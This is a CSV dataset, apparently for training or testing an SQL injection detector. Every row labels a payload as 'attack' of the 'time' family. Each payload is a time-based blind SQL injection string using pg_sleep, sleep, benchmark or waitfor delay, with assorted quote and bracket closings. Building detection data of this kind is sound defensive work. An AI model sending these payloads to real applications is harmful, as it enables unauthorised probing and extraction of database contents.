label,payload,family
attack,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",time
attack,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,time
attack,select pg_sleep  (  5  )   and    (    (     (  '%'  =  ',time
attack,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",time
attack,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",time
attack,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,time
attack,1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,time
attack,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",time
attack,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",time
attack,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",time
attack,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,time
attack,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",time
attack,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,time
attack,"1'  )   where 4683  =  4683 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",time
attack,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,time
attack,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,1%'   )    )     )   and sleep  (  5  )   and    (    (     (  '%'  =  ',time
attack,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,time
attack,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",time
attack,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,time
attack,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",time
attack,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe"" like ""ojpe",time
attack,"1""  )   as eoer where 8667  =  8667 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",time
attack,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",time
attack,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",time
attack,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",time
attack," select sleep  (  5  )   and    (    (     (  ""zlal""  =  ""zlal",time
